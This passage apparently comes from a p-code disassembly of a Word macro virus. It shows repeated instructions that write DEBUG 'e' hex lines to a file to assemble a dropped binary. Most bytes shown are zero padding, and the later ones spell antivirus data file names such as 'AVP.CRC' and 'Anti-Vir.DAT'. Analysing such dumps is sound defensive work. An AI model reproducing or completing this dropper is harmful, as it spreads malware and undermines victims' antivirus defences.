' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #174:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #175:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #176:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ba0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #177:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #178:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #179:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #180:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #181:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #182:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #183:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #184:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #185:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #186:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #187:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #188:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #189:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #190:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #191:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #192:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #193:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #194:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #195:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #196:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #197:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #198:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #199:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #200:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #201:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #202:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #203:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #204:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #205:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #206:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #207:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0d90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #208:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0da0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #209:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0db0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #210:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0dc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #211:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0dd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #212:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0de0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #213:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0df0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #214:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #215:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #216:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #217:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #218:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e40 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #219:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #220:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #221:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #222:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #223:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2e "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #224:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ea0 64 72 6f 6c 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #225:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #226:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ec0 41 56 50 2e 43 52 43 00 49 56 50 2e 4e 54 5a 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #227:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ed0 41 6e 74 69 2d 56 69 72 2e 44 41 54 00 43 48 4b "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #228:
